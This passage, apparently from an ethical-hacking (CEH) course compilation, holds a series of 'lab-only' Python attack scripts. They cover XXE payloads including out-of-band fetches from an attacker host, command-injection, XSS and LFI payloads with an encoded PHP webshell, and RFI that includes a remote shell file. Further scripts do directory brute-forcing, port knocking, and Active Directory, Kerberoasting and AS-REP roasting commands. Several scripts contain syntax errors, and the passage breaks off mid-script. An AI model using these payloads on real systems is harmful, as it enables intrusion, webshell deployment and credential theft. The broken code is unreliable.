> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 18-union-sqli-exploit.py` for packet capture/port scanning, or `./18-union-sqli-exploit.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 264 : XML External Entity (XXE) Payload Generation

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: XML External Entity (XXE) Payload Generation

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: XXE (XML External Entity) Exploit Helper
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates XXE payloads for file read, SSRF, etc.
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET = "http://192.168.100.10/xxe-vuln.php"
# -----------------------------------------------------------------------------------

def generate_payloads():
    payloads = []
    # 1. Basic file read (Linux)
    payload1 = '''<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>'''
    payloads.append(("Basic File Read", payload1))
    # 2. Basic file read (Windows)
    payload2 = '''<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>'''
    payloads.append(("Windows File Read", payload2))
    # 3. SSRF payload
    payload3 = '''<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal" >]>
<foo>&xxe;</foo>'''
    payloads.append(("SSRF Payload", payload3))
    # 4. Blind XXE (Out-of-Band)
    payload4 = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://your-lab-attacker-ip/evil.dtd" >
%xxe;
]>
<foo>&send;</foo>'''
    payloads.append(("Blind OOB XXE", payload4))
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: XXE Exploit Payload Generator")
    print("="*80)
    print("-"*80")
    for name, payload in generate_payloads():
        print(f"\n[*] {name}:")
        print("-"*40)
        print(payload)
        print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 19-xxe-exploit-helper.py` for packet capture/port scanning, or `./19-xxe-exploit-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 265 : Advanced Command Injection Payload Bypass Testing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Command Injection Payload Bypass Testing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced Command Injection Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests various command injection bypasses
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/cmd.php?input="
LAB_COMMAND = "whoami"  # Command to execute
# -----------------------------------------------------------------------------------

def generate_bypasses(cmd):
    bypasses = []
    separators = [";", "&&", "||", "|", "&", "\n", "\r", "$(", "`", ";", "%0a", "%0d", "%0a%0d"]
    for sep in separators:
        bypasses.append(f"{sep}{cmd}")
        bypasses.append(f"{sep}{cmd}{sep}")
        bypasses.append(f"a{sep}{cmd}")
    return bypasses

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Command Injection Tester")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80")
    print("[*] Testing bypasses...")
    for payload in generate_bypasses(LAB_COMMAND):
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{payload}", timeout=5, verify=False)
            if resp.status_code == 200:
                print(f"[+] Payload: {payload}")
                print(f"[+] Response snippet: {resp.text[:200]}...")
        except Exception as e:
            pass

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 20-command-injection-advanced.py` for packet capture/port scanning, or `./20-command-injection-advanced.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 266 : Advanced XSS Payload Bypass Testing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced XSS Payload Bypass Testing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced XSS Tester (Stored + Reflected)
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests various XSS payloads and bypasses
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/xss.php?input="
# -----------------------------------------------------------------------------------

def generate_xss_payloads():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<select onfocus=alert('XSS')><option>1",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<a href='javascript:alert(1)'>Click</a>",
        "<iframe src='javascript:alert(1)'>",
        "<img src='javascript:alert(1)'>",
        "<svg><script>alert`xss`</script>",
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<scrscriptipt>alert(1)</scrscriptipt>"
    ]
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: Advanced XSS Tester")
    print("="*80)
    print("[*] Payloads to test (LAB ONLY):")
    for payload in generate_xss_payloads():
        print(f"   - {payload}")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 21-xss-advanced-tester.py` for packet capture/port scanning, or `./21-xss-advanced-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 267 : Advanced Local File Inclusion (LFI) Testing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Local File Inclusion (LFI) Testing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced LFI (Local File Inclusion) Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests various LFI bypasses (path traversal, wrappers, etc.)
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/lfi.php?file="
LAB_TARGET_FILE = "/etc/passwd"
# -----------------------------------------------------------------------------------

def generate_lfi_payloads(target_file):
    payloads = []
    # Basic traversal
    payloads.append(target_file)
    for i in range(1,10):
        payloads.append("../"*i + target_file.lstrip('/'))
    # Wrappers
    payloads.append(f"php://filter/convert.base64-encode/resource={target_file}")
    payloads.append(f"php://filter/read=convert.base64-encode/resource={target_file}")
    payloads.append(f"file://{target_file}")
    payloads.append(f"expect://id")
    payloads.append(f"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjIl0pOyA/Pg==")
    # Null byte bypass (old PHP)
    payloads.append(target_file + "%00")
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: Advanced LFI Tester")
    print("="*80")
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80")
    for payload in generate_lfi_payloads(LAB_TARGET_FILE):
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{payload}", timeout=5, verify=False)
            if resp.status_code ==200 and len(resp.text) >100:
                print(f"[+] Payload: {payload}")
                print(f"[+] Response: {resp.text[:300]}...")
        except Exception as e:
            pass

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 22-lfi-advanced-tester.py` for packet capture/port scanning, or `./22-lfi-advanced-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 268 : Remote File Inclusion (RFI) Payload Testing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Remote File Inclusion (RFI) Payload Testing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: RFI (Remote File Inclusion) Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Tests RFI vulnerabilities and payloads
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/rfi.php?page="
LAB_ATTACKER_SHELL_URL = "http://your-lab-attacker-ip/shell.txt"
# -----------------------------------------------------------------------------------

def generate_rfi_payloads(attacker_url):
    payloads = [
        attacker_url,
        attacker_url + "?",
        attacker_url + "%00",
        attacker_url + "%2500",
        attacker_url + "#",
        "php://input",
        "data://text/plain,<?php system('id'); ?>"
    ]
    return payloads

def main():
    print("="*80)
    print("LAB-ONLY: RFI Tester")
    print("="*80)
    print("[*] Payloads to test (LAB ONLY):")
    for payload in generate_rfi_payloads(LAB_ATTACKER_SHELL_URL):
        print(f"   - {payload}")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 23-rfi-tester.py` for packet capture/port scanning, or `./23-rfi-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 269 : Subdomain Takeover Vulnerability Checking

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Subdomain Takeover Vulnerability Checking

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Subdomain Takeover Checker
# CEH v13 Master Module 02
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Checks for subdomain takeover vulnerabilities
import requests
import sys
import dns.resolver

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "example-lab.com"
LAB_WORDLIST = ["www", "api", "dev", "staging", "test", "admin", "ftp", "mail", "cdn", "git"]
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Subdomain Takeover Checker")
    print("="*80")
    print(f"[*] Target domain: {LAB_DOMAIN}")
    print("-"*80")
    resolver = dns.resolver.Resolver()
    for sub in LAB_WORDLIST:
        subdomain = f"{sub}.{LAB_DOMAIN}"
        try:
            answers = resolver.resolve(subdomain, 'CNAME')
            for rdata in answers:
                print(f"[+] Found CNAME for {subdomain} → {rdata.target}")
        except Exception as e:
            pass

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 24-subdomain-takeover-check.py` for packet capture/port scanning, or `./24-subdomain-takeover-check.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 270 : Advanced Directory & File Bruteforcing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Directory & File Bruteforcing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced Directory Bruteforcer
# CEH v13 Master Module 02
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Brute-forces directories/files with custom wordlists and extensions
import requests
import sys
from queue import Queue
import threading

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/"
LAB_WORDLIST = ["admin", "backup", "config", "css", "images", "js", "phpmyadmin", "robots.txt", "sitemap.xml", "test", "upload", "wp-admin"]
LAB_EXTENSIONS = ["php", "html", "txt", "bak", "old", "zip"]
LAB_THREADS = 10
# -----------------------------------------------------------------------------------

def worker():
    while not q.empty():
        path = q.get()
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{path}", timeout=5, verify=False)
            if resp.status_code in [200, 301, 302, 403]:
                print(f"[+] Found: {LAB_TARGET_URL}{path} (Status: {resp.status_code})")
        except Exception as e:
            pass
        finally:
            q.task_done()

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Directory Bruteforcer")
    print("="*80")
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80")
    global q
    q = Queue()
    for word in LAB_WORDLIST:
        q.put(word)
        for ext in LAB_EXTENSIONS:
            q.put(f"{word}.{ext}")
    print(f"[*] Starting {LAB_THREADS} threads...")
    for i in range(LAB_THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
    q.join()
    print("[*] Done!")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 25-directory-bruteforce-advanced.py` for packet capture/port scanning, or `./25-directory-bruteforce-advanced.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 271 : Port Knocking Sequence Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Port Knocking Sequence Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Port Knocking Helper
# CEH v13 Master Module 03
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Sends port knocking sequences to open hidden ports!
import socket
import sys
import time

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_IP = "192.168.100.10"
LAB_KNOCK_SEQUENCE = [1000, 2000, 3000]
LAB_DELAY = 0.2  # Seconds between knocks
# -----------------------------------------------------------------------------------

def knock_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    try:
        sock.connect((ip, port))
    except:
        pass
    finally:
        sock.close()

def main():
    print("="*80)
    print("LAB-ONLY: Port Knocking Helper")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET_IP}")
    print(f"[*] Knock sequence: {LAB_KNOCK_SEQUENCE}")
    print("-"*80")
    for port in LAB_KNOCK_SEQUENCE:
        print(f"[*] Knocking on port {port}...")
        knock_port(LAB_TARGET_IP, port)
        time.sleep(LAB_DELAY)
    print("[+] Knocking sequence complete! Now try connecting to the hidden port!")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_IP for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 26-port-knocking-helper.py` for packet capture/port scanning, or `./26-port-knocking-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 272 : Advanced Active Directory Enumeration

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Active Directory Enumeration

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced Active Directory Enumeration Helper
# CEH v13 Master Module 04
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for enum4linux-ng, bloodhound-python, etc.!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "lab-domain.local"
LAB_DOMAIN_CONTROLLER = "192.168.100.10"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: AD Enumeration Helper")
    print("="*80")
    print("-"*80")
    print("[*] Commands to run in your lab:")
    print("-"*80")
    print("# 1. enum4linux-ng:")
    print(f"   enum4linux-ng {LAB_DOMAIN_CONTROLLER} -A")
    print("# 2. bloodhound-python:")
    print(f"   bloodhound-python -c All -d {LAB_DOMAIN} -u user -p 'labpass123 -ns {LAB_DOMAIN_CONTROLLER}")
    print("# 3. ldapsearch:")
    print(f"   ldapsearch -x -h {LAB_DOMAIN_CONTROLLER} -b \"dc=lab-domain,dc=local\"")
    print("# 4. crackmapexec:")
    print(f"   crackmapexec smb {LAB_DOMAIN_CONTROLLER} --users")
    print(f"   crackmapexec smb {LAB_DOMAIN_CONTROLLER} --shares")
    print(f"   crackmapexec smb {LAB_DOMAIN_CONTROLLER} --groups")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 27-ad-enum-advanced.py` for packet capture/port scanning, or `./27-ad-enum-advanced.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 273 : Kerberoasting Payload & Hash Extraction

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Kerberoasting Payload & Hash Extraction

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Kerberoasting Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for Kerberoasting with Impacket!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "lab-domain.local"
LAB_DOMAIN_CONTROLLER = "192.168.100.10"
LAB_USER = "lab-user"
LAB_PASS = "lab-pass123"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Kerberoasting Helper")
    print("="*80")
    print("-"*80")
    print("[*] Commands to run:")
    print("-"*80")
    print("# 1. Find SPNs:")
    print(f"   GetUserSPNs.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASS} -dc-ip {LAB_DOMAIN_CONTROLLER} -request")
    print("# 2. Crack with hashcat:")
    print("   hashcat -m 13100 kerberoast.hash wordlist.txt")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 28-kerberoasting-helper.py` for packet capture/port scanning, or `./28-kerberoasting-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 274 : AS-REP Roasting Hash Extraction

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: AS-REP Roasting Hash Extraction

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: AS-REP Roasting Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for AS-REP Roasting!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "lab-domain.local"
LAB_DOMAIN_CONTROLLER = "192.168.100.10"
LAB_USERLIST = "userlist.txt"
